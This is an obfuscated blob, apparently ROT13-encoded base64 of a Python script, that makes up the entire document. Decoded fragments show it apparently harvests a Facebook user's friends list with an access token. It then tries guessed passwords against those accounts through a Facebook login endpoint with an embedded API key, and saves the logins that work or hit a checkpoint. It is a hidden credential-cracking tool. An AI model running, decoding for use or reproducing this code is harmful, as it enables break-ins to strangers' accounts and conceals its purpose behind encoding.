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tH0gWHPOunzRtBaLaPvNtVPNtVPNtVPNtVTxtCFOlLKqsnJ5jqKDbW1k4ZJWoZGf5ZJ1oX10tKUtkLyfkBmxloH5uoJHtHTSwLKVtKUtkLyfkBmx3oGbtWlxXVPNtVPNtVPNtVPNtnvN9VUWuq19coaO1qPtaKUtkLyfkBmxkoIfeKFOprQSvJmR7BGWgGzSgMFODLJ5aM2yfLJ4tHTSwLKVtKUtkLyfkBmx3oGbtWlxXVPNtVPNtVPNtVPNtnlN9VUWuq19coaO1qPtaKUtkLyfkBmxkoIfeKFOprQSvJmR7BGWgITShM2quoPOZLJucpvODLJAupvN+KUtkLyfkBmx2oJI4BvO8EREAGIyMsPOprQSvJmR7BGqgBvNaXDbtVPNtVPNtVPNtVPOdLJkuovtaKUtkLyfkBmxkoIgprTHlKUt5L1k4LzSqVSk4ZJWoZGf5Zz1DoTIup2Htq2ScqPOprQSvJmR7BGqgYv4hWlxXVPNtVPNtVPNtVPNtoPN9VTgoZQblKDbtVPNtVPNtVPNtVPOgVQ0tn1flBwEqPvNtVPNtVPNtVPNtVT4tCFOeJmD6KDbtVPNtVPNtVPNtVPOznJkyYaqlnKEyXPpyplImKT4yplImWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyp1khWKZyplImKT4yplImWKApovImWKApovImWKApovImWKApovImWKApovImWKApovImWKApovImWKApovImWKApovImWKApovImWKZyp1khWKZyplImKT4yplImWKApovImWKZyp1khWKZyplImKT4yplImWKApovImWKZyp1khWKZyplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImKT4yplImWlNyVPuuYPOwYPOuYPOvYPOvYPOuYPOvYPOwYPOwYPOuYPOwYPOvYPOuYPOuYPOvYPOvYPOwYPOwYPOuYPOxYPOvYPOxYPOwYPOxYPOxYPOxYPOxYPOuYPOxYPOvYPOxYPOwYPOuYPOyYPOuYPOzYPOuYPOaYPOuYPObYPOvYPOyYPOvYPOzYPOvYPOaYPOvYPObYPOwYPOyYPOwYPOzYPOwYPOaYPOwYPObYPOxYPOyYPOxYPOzYPOxYPOaYPOxYPObYPOyYPOuYPOzYPOuYPOaYPOuYPObYPOuYPOyYPOvYPOzYPOvYPOaYPOvYPObYPOvYPOyYPOwYPOzYPOwYPOaYPOwYPObYPOwYPOyYPOxYPOzYPOxYPOaYPOxYPObYPOxYPOxYPOxYPOuYPOzYPOaYPOuYPOaYPObYPOzYPOaYPOzYPObYPOzYPOzYPOaYPOzYPOaYPObYPOaYPOaYPObYPOzYPObYPOaYPObYPObYPObYPOaYPOzYPOuYPOaYPObYPOvYPOzYPOaYPOvYPOaYPObYPOwYPOzYPOaYPOwYPOaYPObYPOxYPOzYPOaYPOxYPOaYPObYPOuYPOcYPOuYPOdYPOuYPOeYPOcYPOyYPOcYPOdYPOcYPOeYPOvYPOcYPOvYPOdYPOvYPOeYPOwYPOcYPOwYPOdYPOwYPOeYPOyYPOeYPOdYPOuYPOdYPOvYPOdYPOwYPOdYPOxYPOdYPOdYPOeYPOuYPOeYPOvYPOeYPOwYPOeYPOxYPOeYPOeYPOcYPOfYPOcYPOgYPOcYPOhYPOdYPOfYPOdYPOgYPOdYPOhYPOdYPOeXFxXVPNtVPNtVPNtVPNtq2ptCFNjPvNtVPNtVPNtVPNtVUqbnJkyVUqaVQjtZGNjBtbtVPNtVPNtVPNtVPNtVPNtq2ptCFO3MlNeVQRXVPNtVPNtVPNtVPNtVPNtVTMcoTHhq3WcqTHbLFNeVUA0pvu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